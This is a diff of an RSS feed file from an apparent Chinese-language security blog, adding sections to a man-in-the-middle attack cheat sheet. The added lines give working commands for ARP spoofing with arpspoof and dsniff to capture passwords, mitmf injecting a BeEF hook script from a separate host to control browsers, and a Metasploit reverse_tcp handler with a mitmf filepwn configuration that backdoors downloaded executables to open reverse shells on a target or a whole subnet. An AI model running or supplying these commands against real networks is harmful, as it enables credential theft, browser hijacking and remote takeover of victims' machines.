@@ -5,8 +5,8 @@
     <description>A blog about programming and network security</description>
     <link>http://localhost:4000/</link>
     <atom:link href="http://localhost:4000/feed.xml" rel="self" type="application/rss+xml" />
-    <pubDate>Mon, 22 May 2017 21:58:03 +0800</pubDate>
-    <lastBuildDate>Mon, 22 May 2017 21:58:03 +0800</lastBuildDate>
+    <pubDate>Wed, 24 May 2017 08:07:56 +0800</pubDate>
+    <lastBuildDate>Wed, 24 May 2017 08:07:56 +0800</lastBuildDate>
     <generator>Jekyll v3.4.2</generator>
     
       <item>
@@ -239,13 +239,15 @@ hamster
 &lt;/code&gt;&lt;/pre&gt;
 &lt;/div&gt;
 
-&lt;h4 id=&quot;0xc-mitmfdsniff&quot;&gt;0xc mitmf+dsniff&lt;/h4&gt;
+&lt;h4 id=&quot;0xc-arpspoofdsniff&quot;&gt;0xc arpspoof+dsniff&lt;/h4&gt;
 
 &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;作用:获取明文密码
+echo 1 &amp;gt; /proc/sys/net/ipv4/ip_forward
+arpspoof -i eth0 -t 192.168.1.101 192.168.1.1   欺骗192.168.1.101
+    [arpspoof -i eth0 192.168.1.1    欺骗所有机器]
+dsniff(new terminal)
 
-mitmf -i eth0 --spoof --arp --target 192.168.1.101 --gateway 192.168.1.1
-dsniff -i eth0
-    或dsniff -p file.pcap(这里需要中间人欺骗后wireshark抓包)
+类似于cain的效果,但是测试不能截到http表单中的密码
 &lt;/code&gt;&lt;/pre&gt;
 &lt;/div&gt;
 
@@ -276,6 +278,60 @@ ettercap -Tqi eth0 -M arp -P dns_spoof /192.168.1.101// ///
 
 msf设置利用ie漏洞或其他浏览器的漏洞
     
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;h4 id=&quot;0xf-mitmfbeef&quot;&gt;0xf mitmf+beef&lt;/h4&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;作用:控制浏览器
+
+mitmf -i eth0 --spoof --arp --target 192.168.1.101 --gateway 192.168.1.1 --hsts --inject --js-url http://192.168.1.104:3000/hook.js
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;h4 id=&quot;0xg-mitmfmsf&quot;&gt;0xg mitmf+msf&lt;/h4&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;作用:获取shell
+
+msfconsole
+use multi/hanlder
+set payload windows/meterpreter/reverse_tcp
+set lhost 192.168.0.106
+set lport 4444
+exploit
+
+msfconsole(another terminal)
+load msgrpc Pass=abc123
+如果到这里报错无法连接msfrpc则根据需要修改/etc/mitmf/mitmf.conf中的与msfrpc相关的设置(端口或密码)
+
+vi /etc/mitmf/mitmf.conf
+    eg.相关设置如下
+            [[[[WindowsIntelx86]]]]
+			PATCH_TYPE = APPEND #JUMP/SINGLE/APPEND
+			# PATCH_METHOD overwrites PATCH_TYPE, use automatic, replace, or onionduke
+			PATCH_METHOD = automatic
+			HOST = 192.168.0.106
+			PORT = 4444
+			# SHELL for use with automatic PATCH_METHOD
+			SHELL = iat_reverse_tcp_inline_threaded
+			# SUPPLIED_SHELLCODE for use with a user_supplied_shellcode payload
+			SUPPLIED_SHELLCODE = None
+			ZERO_CERT = True
+			# PATCH_DLLs as they come across
+			PATCH_DLL = False
+			# RUNAS_ADMIN will attempt to patch requestedExecutionLevel as highestAvailable
+			RUNAS_ADMIN = False
+			# XP_MODE  - to support XP targets
+			XP_MODE = True
+			# SUPPLIED_BINARY is for use with PATCH_METHOD 'onionduke' DLL/EXE can be x64 and
+			#  with PATCH_METHOD 'replace' use an EXE not DLL
+			SUPPLIED_BINARY = veil_go_payload.exe
+			MSFPAYLOAD = windows/meterpreter/reverse_tcp
+
+mitmf -i eth0 --spoof --arp --target 192.168.1.101 --gateway 192.168.1.1 --filepwn(欺骗192.168.1.101)
+    mitmf -i eth0 --spoof --arp --gateway 192.168.1.1 --filepwn(欺骗c段)
+
+
 &lt;/code&gt;&lt;/pre&gt;
 &lt;/div&gt;
 </description>
